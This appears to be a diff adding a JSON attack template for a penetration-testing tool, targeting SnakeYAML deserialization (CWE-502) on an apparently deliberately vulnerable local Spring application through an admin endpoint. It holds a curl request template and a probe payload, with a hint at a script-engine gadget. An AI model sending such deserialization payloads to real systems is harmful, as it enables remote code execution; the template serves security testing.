@@ -1,0 +1,52 @@
+{
+  "templateId": "snakeyaml-load",
+  "attackType": {
+    "name": "deserialization",
+    "cwe": "CWE-502"
+  },
+  "dependency": {
+    "runtime": "java",
+    "framework": "spring",
+    "library": "snakeyaml@1.33"
+  },
+  "target": {
+    "method": "POST",
+    "endpoint": "/admin/schedule/preview",
+    "application": "vul-web2-wonchang"
+  },
+  "request": {
+    "curl": "curl -s -X POST '{{origin}}/admin/schedule/preview' -H 'Cookie: {{adminSession}}' --data-urlencode 'payload={{payload}}'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:4102"
+    },
+    "adminSession": {
+      "required": true,
+      "type": "string",
+      "desc": "관리자 세션 쿠키 (수정요망)",
+      "example": "wonchang_sid=..."
+    },
+    "payload": {
+      "required": true,
+      "type": "yaml",
+      "desc": "SnakeYAML 역직렬화 페이로드",
+      "pickFrom": "payloads",
+      "example": "!!javax.script..."
+    }
+  },
+  "payloads": [
+    "!!java.util.Date []"
+  ],
+  "verify": {
+    "mode": "manual"
+  },
+  "executor": "manual",
+  "mutating": true,
+  "origin": "imported",
+  "source": "PayloadsAllTheThings (Java deserialization)",
+  "trust": "unverified"
+}
